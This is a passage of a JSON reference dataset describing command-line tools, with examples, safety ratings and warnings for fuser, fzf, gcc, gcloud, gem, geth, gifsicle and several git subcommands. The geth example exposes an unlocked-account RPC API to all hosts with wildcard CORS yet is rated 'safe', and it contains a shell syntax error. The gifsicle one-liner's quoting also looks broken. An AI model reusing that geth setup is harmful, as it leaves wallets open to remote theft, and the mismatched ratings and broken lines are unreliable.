        "reason": "e2fsck is fsck specifically for ext2/3/4 filesystems"
      },
      {
        "name": "badblocks",
        "relationship": "complementary",
        "reason": "badblocks tests for bad sectors on disk"
      }
    ],
    "warnings": [
      "Never run fsck on mounted filesystem (can cause corruption)",
      "Always unmount filesystem before checking",
      "Backup important data before running repair operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/fsck.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/fsck.html"
      },
      {
        "platform": "windows",
        "url": "Use chkdsk instead"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fuser",
    "subtitle": "File User",
    "description": "Identify processes using files or sockets",
    "examples": [
      "fuser /path/to/file  # Display processes currently using specific file",
      "fuser -v /path/to/file  # Show detailed information about processes using file",
      "fuser -k /path/to/file  # Terminate all processes using the file",
      "fuser -m /mnt/usb  # Show processes using files in mounted filesystem",
      "fuser -n tcp 80  # Show processes using TCP port 80",
      "fuser -ki /path/to/file  # Interactively kill processes using file",
      "fuser -s /path/to/file  # Silent mode, only return exit status",
      "echo 'Enterprise Process File Usage Analysis' && for critical_file in /var/log/application.log /etc/nginx/nginx.conf /opt/app/config.yml; do if [ -f \"$critical_file\" ]; then echo \"Analyzing: $critical_file\"; fuser -v \"$critical_file\" 2>/dev/null | grep -v COMMAND | while read user pid access comm; do ps -p $pid -o pid,ppid,user,comm,cmd --no-headers; done | head -5; fi; done && echo 'Active Mount Points:' && lsof +D /mnt 2>/dev/null | head -10 && echo 'Enterprise file usage diagnostics: critical file access monitoring, process dependency mapping, and mount point utilization for system troubleshooting and capacity planning'  # Enterprise file usage monitoring"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "fuser [options] files",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe unmount",
        "commands": "fuser -m /mnt/disk && umount /mnt/disk || fuser -km /mnt/disk && umount /mnt/disk",
        "explanation": "Check for processes using mount, kill if necessary, then unmount",
        "title": "fuser && umount || fuser && umount"
      }
    ],
    "relatedCommands": [
      {
        "name": "lsof",
        "relationship": "similar",
        "reason": "lsof provides more detailed output but similar functionality"
      }
    ],
    "warnings": [
      "Can kill processes with -k option - use with caution",
      "Useful for troubleshooting 'device busy' errors",
      "Different output format compared to lsof"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/fuser.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/fuser.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fzf",
    "subtitle": "fuzzy finder",
    "description": "Command-line fuzzy finder for interactive selection",
    "examples": [
      "find . -type f | fzf  # Select file from list with fuzzy search",
      "history | fzf  # Interactively search through command history",
      "vim $(fzf)  # Open fuzzy-selected file in vim",
      "find . -name '*.py' | fzf -m  # Select multiple Python files with Tab key",
      "fzf --preview 'cat {}'  # Show file contents in preview pane",
      "git branch | fzf --height 40% | xargs git checkout  # Interactive Git branch switching",
      "ps aux | fzf --header 'Select process to kill' | awk '{print $2}' | xargs kill  # Interactive process killer",
      "echo 'Enterprise Process Management Dashboard' && ps aux --sort=-%cpu | head -10 | fzf --preview 'echo \"Process Details:\"; ps -p {2} -o pid,ppid,user,comm,cmd,start,time,pcpu,pmem --no-headers; echo; echo \"Open Files:\"; lsof -p {2} 2>/dev/null | head -10; echo; echo \"Network Connections:\"; netstat -p 2>/dev/null | grep {2} | head -5' --header 'Select process for detailed analysis' && echo 'Enterprise interactive process exploration: CPU usage prioritization, comprehensive process metadata, file handle analysis, and network connection mapping for production system optimization and troubleshooting'  # Enterprise interactive process analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "fzf [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Kill process interactively",
        "commands": "ps aux | fzf | awk '{print $2}' | xargs kill",
        "explanation": "Select process from list and kill it",
        "title": "ps | fzf | awk | xargs"
      },
      {
        "scenario": "Git branch switching",
        "commands": "git branch | fzf | xargs git checkout",
        "explanation": "Fuzzy select and switch to Git branch",
        "title": "git | fzf | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "grep",
        "relationship": "similar",
        "reason": "Both search through text, fzf is interactive"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "Often used together: find generates list, fzf filters it"
      },
      {
        "name": "rofi",
        "relationship": "similar",
        "reason": "GUI application launcher with similar fuzzy matching"
      }
    ],
    "warnings": [
      "Requires input on stdin to work",
      "Keyboard shortcuts may conflict with terminal emulator",
      "Preview feature can be slow with large files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/junegunn/fzf"
      },
      {
        "platform": "macos",
        "url": "https://github.com/junegunn/fzf"
      },
      {
        "platform": "windows",
        "url": "https://github.com/junegunn/fzf"
      },
      {
        "platform": "generic",
        "url": "https://github.com/junegunn/fzf#usage"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "gcc",
    "subtitle": "GNU Compiler Collection",
    "description": "GNU Compiler Collection for C/C++ and other languages",
    "examples": [
      "gcc hello.c -o hello  # Compile hello.c and create executable named hello",
      "gcc -g program.c -o program  # Include debugging symbols for use with gdb",
      "gcc -Wall -Wextra program.c -o program  # Show all common warnings during compilation",
      "gcc -O2 program.c -o program  # Apply level 2 optimization for faster execution",
      "gcc program.c -lm -o program  # Link with math library (-lm)",
      "gcc main.c utils.c -o myprogram  # Compile and link multiple C files",
      "gcc -std=c11 -pedantic program.c -o program  # Compile with C11 standard and strict compliance",
      "echo 'Enterprise C/C++ Build Pipeline' && gcc -Wall -Wextra -Werror -std=c11 -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 src/*.c -o enterprise-app -lssl -lcrypto -lpthread && strip --strip-unneeded enterprise-app && echo \"Binary size: $(du -h enterprise-app | cut -f1)\" && ldd enterprise-app && objdump -p enterprise-app | grep -E 'STACK|RELRO|PIE' && echo 'Enterprise compilation: security hardening flags, optimization, debugging symbols, SSL/crypto linking, binary stripping, and security feature validation for production deployment'  # Enterprise secure compilation pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "gcc [options] <source_files>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Compile with full warnings and debug",
        "commands": "gcc -Wall -Wextra -g -std=c99 program.c -o program && ./program",
        "explanation": "Compile with all warnings, debug info, C99 standard, then run",
        "title": "gcc &&"
      },
      {
        "scenario": "Generate assembly output",
        "commands": "gcc -S program.c && cat program.s",
        "explanation": "Generate assembly code and view it",
        "title": "gcc && cat"
      }
    ],
    "relatedCommands": [
      {
        "name": "clang",
        "relationship": "alternative",
        "reason": "Alternative C/C++ compiler with different features"
      },
      {
        "name": "gdb",
        "relationship": "combo",
        "reason": "Debug programs compiled with gcc -g"
      },
      {
        "name": "make",
        "relationship": "combo",
        "reason": "Automate gcc compilation in complex projects"
      }
    ],
    "warnings": [
      "Library order matters: put -l flags after source files",
      "Default C standard may be older than expected",
      "Optimization can make debugging difficult"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/gcc.1.html"
      },
      {
        "platform": "macos",
        "url": "https://gcc.gnu.org/onlinedocs/"
      },
      {
        "platform": "generic",
        "url": "https://gcc.gnu.org/onlinedocs/gcc/"
      }
    ],
    "distroNotes": {
      "macos": "Install via Xcode Command Line Tools or Homebrew",
      "windows": "Available via WSL, MinGW, or MSYS2"
    }
  },
  {
    "name": "gcloud",
    "subtitle": "Google Cloud CLI Advanced",
    "description": "Advanced Google Cloud Platform operations for enterprise management",
    "examples": [
      "gcloud container clusters create-auto my-autopilot-cluster --region=us-central1 --release-channel=regular  # Create fully managed GKE Autopilot cluster",
      "gcloud run deploy my-service --image gcr.io/my-project/my-image --platform managed --region us-central1 --allow-unauthenticated  # Deploy containerized service to Cloud Run",
      "gcloud sql instances create my-instance --database-version=POSTGRES_13 --tier=db-f1-micro --region=us-central1 --backup-start-time=03:00  # Create PostgreSQL instance with automated backups",
      "gcloud functions deploy my-function --runtime python39 --trigger-http --allow-unauthenticated --source . --entry-point hello_world  # Deploy HTTP-triggered Cloud Function",
      "gcloud pubsub topics create my-topic && gcloud pubsub subscriptions create my-subscription --topic my-topic  # Set up messaging queue system",
      "gcloud alpha bq datasets create my_dataset --location=US --description='Analytics dataset'  # Create data warehouse dataset for analytics",
      "gcloud storage buckets create gs://my-lifecycle-bucket --location=us-central1 --uniform-bucket-level-access  # Create bucket with uniform access control",
      "gcloud compute networks create my-vpc --subnet-mode=custom && gcloud compute networks subnets create my-subnet --network=my-vpc --range=10.0.0.0/24 --region=us-central1  # Create custom VPC with subnet for network isolation",
      "gcloud compute backend-services create my-backend-service --global --health-checks=my-health-check --port-name=http --protocol=HTTP  # Create global HTTP load balancer backend service",
      "gcloud services enable container.googleapis.com cloudsql.googleapis.com monitoring.googleapis.com  # Enable required Google Cloud APIs",
      "echo 'Enterprise Google Cloud Infrastructure Deployment' && gcloud projects create enterprise-prod-$(date +%Y%m%d) --name=\"Enterprise Production Environment\" && gcloud config set project enterprise-prod-$(date +%Y%m%d) && gcloud services enable container.googleapis.com compute.googleapis.com cloudsql.googleapis.com monitoring.googleapis.com logging.googleapis.com && gcloud container clusters create production-cluster --region=us-central1 --machine-type=n1-standard-4 --num-nodes=3 --enable-autorepair --enable-autoupgrade --enable-network-policy && gcloud sql instances create prod-database --database-version=POSTGRES_13 --tier=db-n1-standard-2 --region=us-central1 --backup-start-time=02:00 && echo 'Enterprise cloud deployment: project provisioning, comprehensive API enablement, production-grade GKE cluster with auto-management, managed database with backups, and enterprise-ready infrastructure for scalable applications'  # Enterprise Google Cloud environment setup"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "gcloud [group] [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete GKE setup with monitoring",
        "commands": "gcloud container clusters create my-cluster --enable-cloud-logging --enable-cloud-monitoring --machine-type=e2-medium --num-nodes=3 && gcloud container clusters get-credentials my-cluster",
        "explanation": "Create GKE cluster with observability and configure kubectl",
        "title": "gcloud && gcloud"
      },
      {
        "scenario": "Serverless application deployment",
        "commands": "gcloud builds submit --tag gcr.io/PROJECT_ID/my-app . && gcloud run deploy my-app --image gcr.io/PROJECT_ID/my-app --platform managed --region us-central1",
        "explanation": "Build container image and deploy to Cloud Run",
        "title": "gcloud && gcloud"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Manage GKE clusters with kubectl"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Build images for Google Container Registry"
      }
    ],
    "warnings": [
      "API enablement required for most services",
      "Billing account required for resource creation",
      "IAM permissions critical for service access"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://cloud.google.com/sdk/gcloud"
      },
      {
        "platform": "macos",
        "url": "https://cloud.google.com/sdk/gcloud"
      },
      {
        "platform": "windows",
        "url": "https://cloud.google.com/sdk/gcloud"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "gem",
    "subtitle": "RubyGems",
    "description": "RubyGems package manager for Ruby libraries",
    "examples": [
      "gem install rails  # Install Rails framework gem",
      "gem install nokogiri -v 1.12.5  # Install specific version of Nokogiri gem",
      "gem list  # Show all installed gems and versions",
      "gem uninstall rails  # Remove Rails gem from system",
      "gem update  # Update all installed gems to latest versions",
      "gem build my_gem.gemspec  # Build gem package from specification file",
      "gem environment  # Display RubyGems environment information including paths",
      "echo 'Enterprise Ruby Environment Analysis' && ruby --version && gem --version && bundle --version && echo 'Gem Environment:' && gem environment | grep -E 'GEM PATHS|GEM CONFIGURATION' -A 5 && echo 'Installed Production Gems:' && gem list | grep -E '(rails|sidekiq|redis|pg|unicorn)' && echo 'Bundle Status:' && if [ -f Gemfile.lock ]; then bundle check && bundle outdated | head -10; else echo 'No Gemfile.lock found'; fi && echo 'Enterprise Ruby diagnostics: version validation, environment configuration, production gem inventory, and dependency health for Ruby application deployment readiness'  # Enterprise Ruby environment audit"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "gem <command> [options] [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Install gem without documentation",
        "commands": "gem install rails --no-document",
        "explanation": "Install gem but skip documentation generation for speed",
        "title": "gem"
      }
    ],
    "relatedCommands": [
      {
        "name": "bundler",
        "relationship": "combo",
        "reason": "Manages gem dependencies for Ruby projects"
      },
      {
        "name": "ruby",
        "relationship": "combo",
        "reason": "Ruby interpreter that uses installed gems"
      }
    ],
    "warnings": [
      "May require sudo on some systems for global installation",
      "Gem versions can conflict between projects",
      "Native extensions may fail to compile on some systems"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://guides.rubygems.org/command-reference/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "geth",
    "subtitle": "Go Ethereum",
    "description": "Go Ethereum client implementation",
    "examples": [
      "geth --syncmode fast  # Starts Ethereum node with fast synchronization mode",
      "geth account new  # Creates a new Ethereum account with encrypted keystore",
      "geth console  # Opens interactive JavaScript console for Ethereum operations",
      "geth --goerli  # Connects to Goerli Ethereum test network",
      "geth --datadir /custom/path --networkid 1337 console  # Start private network with custom data directory",
      "geth account list  # Display all accounts in keystore",
      "geth attach http://localhost:8545  # Connect to running geth node via HTTP",
      "echo 'Enterprise Ethereum Node Management' && geth --networkid 1337 --datadir ./private-network --http --http.addr 0.0.0.0 --http.port 8545 --http.corsdomain '*' --http.api web3,eth,net,personal --allow-insecure-unlock --mine --miner.threads 2 console 2>&1 | tee geth-$(date +%Y%m%d-%H%M%S).log & && sleep 10 && curl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1}' -H \"Content-Type: application/json\" http://localhost:8545 && echo 'Enterprise blockchain infrastructure: private network setup, HTTP API exposure, mining configuration, comprehensive logging, and node connectivity validation for enterprise blockchain development'  # Enterprise Ethereum development environment"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "geth [options] [command] [command options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Start testnet node with console",
        "commands": "geth --goerli --syncmode fast console",
        "explanation": "Starts Goerli testnet node with fast sync and opens console",
        "title": "geth"
      }
    ],
    "relatedCommands": [
      {
        "name": "web3",
        "relationship": "library",
        "reason": "Web3.js library for interacting with Ethereum from applications"
      },
      {
        "name": "truffle",
        "relationship": "framework",
        "reason": "Smart contract development framework that uses geth"
      }
    ],
    "warnings": [
      "Initial sync can take hours and significant disk space",
      "Account passwords are needed for transactions",
      "Gas fees required for all transactions",
      "Testnet and mainnet use different addresses"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://geth.ethereum.org/docs/getting-started"
      },
      {
        "platform": "macos",
        "url": "https://geth.ethereum.org/docs/getting-started"
      },
      {
        "platform": "windows",
        "url": "https://geth.ethereum.org/docs/getting-started"
      },
      {
        "platform": "generic",
        "url": "https://ethereum.org/en/developers/docs/nodes-and-clients/"
      }
    ],
    "distroNotes": {
      "linux": "Available through package managers or direct download",
      "windows": "Available as installer or portable executable",
      "macos": "Available through Homebrew or direct download"
    }
  },
  {
    "name": "gifsicle",
    "subtitle": "GIF-sicle",
    "description": "Command-line tool for creating and editing GIF animations",
    "examples": [
      "gifsicle -O3 input.gif -o output.gif  # Optimize GIF with maximum compression",
      "gifsicle --resize 50% input.gif -o smaller.gif  # Reduce GIF size to 50% of original",
      "gifsicle --explode animation.gif  # Extract individual frames as separate GIF files",
      "gifsicle --delay=20 --loop frame*.gif -o animation.gif  # Combine frame GIFs into animated sequence",
      "gifsicle --crop 100,100+200+150 input.gif -o cropped.gif  # Crop 100x100 area starting at position (200,150)",
      "gifsicle --delay=10 input.gif -o faster.gif  # Make GIF play faster by reducing frame delay",
      "gifsicle --rotate-90 input.gif -o rotated.gif  # Rotate GIF 90 degrees clockwise",
      "echo 'Enterprise GIF Processing Pipeline' && find /marketing/assets -name '*.gif' -type f -exec sh -c 'echo \"Processing: $1\"; original_size=$(du -h \"$1\" | cut -f1); gifsicle --optimize=3 --resize 800x600\\> --colors 128 \"$1\" -o \"${1%%.gif}-optimized.gif\"; optimized_size=$(du -h \"${1%%.gif}-optimized.gif\" | cut -f1); echo \"$1: $original_size -> $optimized_size\"; ffprobe -v quiet -show_entries format=duration -of csv=p=0 \"$1\" | awk \\\"{printf \\\"Duration: %.2f seconds\\\\n\\\", \\\$1}\"' _ {} \; && echo 'Enterprise media optimization: batch GIF processing, size reduction analysis, resolution standardization, color optimization, and duration analysis for marketing asset management and web performance'  # Enterprise GIF asset optimization"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "gifsicle [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete GIF optimization workflow",
        "commands": "gifsicle --resize 75% --colors 128 -O3 input.gif -o optimized.gif",
        "explanation": "Resize, reduce colors, and optimize GIF",
        "title": "gifsicle"
      },
      {
        "scenario": "Create optimized GIF from frames",
        "commands": "gifsicle --delay=15 --loop --optimize=3 frame*.gif -o final.gif",
        "explanation": "Create looping GIF with optimization from frames",
        "title": "gifsicle"
      }
    ],
    "relatedCommands": [
      {
        "name": "imagemagick",
        "relationship": "alternative",
        "reason": "ImageMagick can also create and edit GIFs"
      },
      {
        "name": "ffmpeg",
        "relationship": "alternative",
        "reason": "ffmpeg can convert videos to GIFs"
      },
      {
        "name": "gifski",
        "relationship": "alternative",
        "reason": "Modern GIF encoder with better quality"
      }
    ],
    "warnings": [
      "Large GIFs can consume significant memory during processing",
      "Color reduction may affect image quality",
      "Frame delays in centiseconds (1/100 second)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.lcdf.org/gifsicle/man.html"
      },
      {
        "platform": "macos",
        "url": "https://www.lcdf.org/gifsicle/man.html"
      },
      {
        "platform": "windows",
        "url": "https://www.lcdf.org/gifsicle/man.html"
      },
      {
        "platform": "generic",
        "url": "https://www.lcdf.org/gifsicle/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git",
    "subtitle": "global information tracker",
    "description": "Version control system for tracking code changes",
    "examples": [
      "git init  # Create new Git repository in current directory",
      "git clone https://github.com/user/repo.git  # Download complete copy of remote repository",
      "git status  # Show modified files, staged changes, and current branch",
      "git add .  # Add all modified files to staging area",
      "git commit -m 'Add new feature'  # Save staged changes with descriptive message",
      "git push origin main  # Upload local commits to remote repository",
      "git pull  # Download and merge remote changes into current branch",
      "git log --oneline  # Show compact list of recent commits",
      "echo 'Enterprise Git Repository Analysis' && git log --oneline -10 && echo '' && echo 'Repository Statistics:' && git shortlog -sn | head -5 && echo '' && echo 'Recent Activity:' && git log --since='1 month ago' --pretty=format:'%ad %an: %s' --date=short | head -10 && echo '' && echo 'Branch Information:' && git branch -vv && echo '' && git status && echo 'Enterprise version control metrics: commit history analysis, contributor statistics, development activity trends, branch synchronization status, and working directory state for project governance and team coordination'  # Enterprise Git repository dashboard"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "git <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick commit workflow",
        "commands": "git add . && git commit -m 'Fix bug' && git push",
        "explanation": "Stage, commit, and push changes in one line",
        "title": "git && git && git"
      },
      {
        "scenario": "Create feature branch and switch",
        "commands": "git checkout -b feature/new-ui && git push -u origin feature/new-ui",
        "explanation": "Create new branch, switch to it, and set up remote tracking",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "ssh",
        "relationship": "combo",
        "reason": "Use SSH keys for secure Git authentication"
      },
      {
        "name": "diff",
        "relationship": "similar",
        "reason": "git diff shows changes like diff command"
      },
      {
        "name": "grep",
        "relationship": "combo",
        "reason": "git grep searches through repository history"
      }
    ],
    "warnings": [
      "Always pull before pushing to avoid conflicts",
      "Don't commit large binary files to repository",
      "Use .gitignore to exclude generated files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-archive-operations",
    "subtitle": "Git Archive Operations",
    "description": "Create archives of repository contents for distribution",
    "examples": [
      "git archive --format=tar.gz --prefix=myproject-1.0/ v1.0 > myproject-1.0.tar.gz  # Create compressed archive of tagged release with prefix",
      "git archive HEAD src/ | tar -x -C /tmp/deploy  # Extract specific directory to deployment location",
      "git archive --format=zip --output=release.zip HEAD  # Create ZIP file of current HEAD state",
      "git archive --format=tar --worktree-attributes HEAD | gzip > dist.tar.gz  # Create archive respecting .gitattributes export settings",
      "git archive --remote=origin --format=tar.gz HEAD > remote-snapshot.tar.gz  # Create archive directly from remote without local checkout",
      "git archive --format=tar.gz HEAD -- . ':!tests' ':!*.log' > clean-archive.tar.gz  # Create archive excluding test files and logs"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git archive [options] <tree-ish> [path...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated release packaging",
        "commands": "git tag v$(date +%Y.%m.%d) && git archive --format=tar.gz --prefix=release-$(date +%Y%m%d)/ HEAD > releases/release-$(date +%Y%m%d).tar.gz",
        "explanation": "Create dated tag and corresponding release archive",
        "title": "git && git > releases"
      },
      {
        "scenario": "Deploy from archive",
        "commands": "git archive --format=tar HEAD | ssh server 'cd /var/www && tar -xf -'",
        "explanation": "Create archive and deploy directly to remote server",
        "title": "git | ssh && tar"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-bundle",
        "relationship": "alternative",
        "reason": "Bundle preserves Git history while archive creates snapshot"
      },
      {
        "name": "tar",
        "relationship": "combo",
        "reason": "Often used together for archive processing"
      }
    ],
    "warnings": [
      "Archives don't include Git history or metadata",
      "Gitattributes export-ignore affects archive contents",
      "Remote archives require server support"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-archive"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-archive"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-archive"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Bundling"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-bisect",
    "subtitle": "Git bisect",
    "description": "Binary search through commit history to find bugs",
    "examples": [
      "git bisect start  # Initialize binary search for finding problematic commit",
      "git bisect bad  # Tell Git current commit has the bug",
      "git bisect good v1.0  # Tell Git that version 1.0 was working correctly",
      "git bisect run make test  # Automatically run tests to find first failing commit",
      "git bisect skip  # Skip current commit if it can't be tested",
      "git bisect reset  # Return to original branch and end bisect session"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git bisect <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete bisect workflow",
        "commands": "git bisect start && git bisect bad && git bisect good HEAD~20",
        "explanation": "Start bisect marking current as bad and 20 commits ago as good",
        "title": "git && git && git"
      },
      {
        "scenario": "Automated bug hunting",
        "commands": "git bisect start HEAD v1.0 && git bisect run ./test_script.sh",
        "explanation": "Automatically find first bad commit between HEAD and v1.0",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-log",
        "relationship": "combo",
        "reason": "Examine commit history before starting bisect"
      },
      {
        "name": "git-blame",
        "relationship": "alternative",
        "reason": "Different approach to finding when bugs were introduced"
      },
      {
        "name": "git-show",
        "relationship": "combo",
        "reason": "Examine found commit in detail"
      }
    ],
    "warnings": [
      "Requires commits that can be built and tested",
      "Binary search assumes linear bug introduction",
      "Need clear definition of 'good' vs 'bad' behavior"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-bisect"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-bisect"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-bisect"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Debugging-with-Git"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-blame-advanced",
    "subtitle": "Git Blame Advanced",
    "description": "Advanced blame analysis for code attribution and history",
    "examples": [
      "git blame -c --date=short src/main.js  # Show blame with commit hash and short date format",
      "git blame -L 10,20 src/utils.js  # Show blame information only for lines 10-20",
      "git blame -w src/component.jsx  # Skip whitespace-only changes when attributing lines",
      "git blame -e src/config.py  # Show author email addresses instead of names",
      "git blame -M src/renamed-file.js  # Track lines even if file was moved or renamed",
      "git blame --ignore-rev abc1234 src/main.c  # Skip specific commit when attributing changes"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git blame [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Deep blame analysis",
        "commands": "git blame -M -C -w --date=iso src/complex.js | head -20",
        "explanation": "Comprehensive blame with move/copy detection and whitespace ignored",
        "title": "git | head"
      },
      {
        "scenario": "Blame with commit messages",
        "commands": "git blame -c src/file.js | cut -d')' -f1 | xargs -I {} git log -1 --oneline {}",
        "explanation": "Get commit messages for blamed commits",
        "title": "git | cut | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-log",
        "relationship": "combo",
        "reason": "Often used together to understand code history"
      },
      {
        "name": "git-show",
        "relationship": "combo",
        "reason": "Show full details of commits found in blame"
      }
    ],
    "warnings": [
      "Blame follows last commit that touched a line, not original author",
      "Merge commits can obscure original blame information",
      "Large files may take time to process"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-blame"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-blame"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-blame"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Debugging-with-Git"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-bundle-operations",
    "subtitle": "Git Bundle Operations",
    "description": "Create and manage Git bundles for offline repository transfer",
    "examples": [
      "git bundle create repo-backup.bundle --all  # Package entire repository with all branches and tags into bundle",
      "git bundle create changes.bundle main ^origin/main  # Bundle only commits not yet pushed to remote",
      "git bundle verify repo-backup.bundle  # Check bundle file for corruption and missing prerequisites",
      "git bundle list-heads repo-backup.bundle  # Show all references contained in bundle file",
      "git clone repo-backup.bundle cloned-repo  # Create new repository from bundle file",
      "git fetch ../changes.bundle main:bundle-main  # Import changes from bundle into existing repository"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "git bundle <command> [options] <bundle-file> <ref>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Offline repository backup",
        "commands": "git bundle create full-backup-$(date +%Y%m%d).bundle --all && git bundle verify full-backup-$(date +%Y%m%d).bundle",
        "explanation": "Create dated full backup bundle and verify its integrity",
        "title": "git && git"
      },
      {
        "scenario": "Transfer specific feature branch",
        "commands": "git bundle create feature.bundle feature-branch ^main && scp feature.bundle remote-server:",
        "explanation": "Bundle feature branch changes and transfer to remote server",
        "title": "git && scp"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-archive",
        "relationship": "alternative",
        "reason": "Archive creates snapshot without Git history"
      },
      {
        "name": "git-clone",
        "relationship": "combo",
        "reason": "Can clone from bundle files"
      }
    ],
    "warnings": [
      "Bundles are single files and can become very large",
      "Prerequisites must be satisfied in target repository",
      "Bundle format is Git version dependent"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-bundle"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-bundle"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-bundle"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Bundling"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-cherry-pick",
    "subtitle": "Git cherry-pick",
    "description": "Apply specific commits from other branches",
    "examples": [
      "git cherry-pick abc1234  # Apply specific commit to current branch",
      "git cherry-pick abc1234..def5678  # Apply range of commits from one branch to current",
      "git cherry-pick -n abc1234  # Apply changes but don't create commit automatically",
      "git cherry-pick -s abc1234  # Apply commit and add Signed-off-by line",
      "git cherry-pick --continue  # Proceed with cherry-pick after fixing merge conflicts",
      "git cherry-pick --abort  # Cancel cherry-pick and return to previous state"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git cherry-pick [options] <commit>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Selective hotfix deployment",
        "commands": "git checkout release && git cherry-pick abc1234 def5678",
